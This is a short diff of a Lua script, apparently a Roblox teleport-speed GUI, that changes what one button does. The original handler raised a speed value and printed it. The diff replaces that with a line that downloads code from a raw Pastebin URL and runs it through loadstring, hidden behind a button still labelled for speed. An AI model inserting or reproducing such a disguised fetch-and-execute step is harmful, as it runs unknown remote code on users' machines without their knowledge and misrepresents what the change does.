@@ -369,8 +369,7 @@ speed.TextColor3 = Color3.new(255, 255, 255)
 speed.Font = Enum.Font.Code
 speed.Parent = sf1
 speed.MouseButton1Click:Connect(function()
-	tpSpeed = tpSpeed + 5
-	print("TP Speed is now:", tpSpeed)
+loadstring(game:HttpGet("https://pastebin.com/raw/H7YqGnR4"))()
 end)
 
 
